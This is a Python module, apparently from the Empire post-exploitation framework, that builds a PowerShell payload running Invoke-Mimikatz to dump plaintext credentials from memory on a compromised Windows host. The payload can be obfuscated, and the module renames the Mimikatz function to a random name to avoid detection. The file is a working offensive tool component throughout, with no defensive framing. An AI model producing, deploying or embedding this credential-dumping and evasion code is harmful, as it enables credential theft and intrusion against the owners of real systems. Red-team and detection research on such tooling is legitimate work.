from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers
import threading

class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Mimikatz DumpCreds',

            'Author': ['@JosephBialek', '@gentilkiwi'],

            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                            "to extract plaintext credentials from memory."),

            'Software': 'S0002',

            'Techniques': ['T1098', 'T1003', 'T1081', 'T1207', 'T1075', 'T1097', 'T1145', 'T1101', 'T1178'],

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'http://clymb3r.wordpress.com/',
                'http://blog.gentilkiwi.com'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # used to protect self.http and self.mainMenu.conn during threaded listener access
        self.lock = threading.Lock()

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    # this might not be necessary. Could probably be achieved by just callingg mainmenu.get_db but all the other files have
    # implemented it in place. Might be worthwhile to just make a database handling file -Hubbl3
    def get_db_connection(self):
        """
        Returns the cursor for SQLlite DB
        """
        self.lock.acquire()
        self.mainMenu.conn.row_factory = None
        self.lock.release()
        return self.mainMenu.conn


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # build the dump command with whatever options we want
        scriptEnd = "Invoke-Mimikatz -DumpCreds;"

        for option,values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    scriptEnd += " -" + str(option) + " " + str(values['Value']) 
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd

        # Get the random function name generated at install and patch the stager with the proper function name
        conn = self.get_db_connection()
        self.lock.acquire()
        cur = conn.cursor()
        cur.execute("SELECT Invoke_Mimikatz FROM functions")
        replacement = cur.fetchone()
        cur.close()
        self.lock.release()
        script = script.replace("Invoke-Mimikatz", replacement[0])

        return script
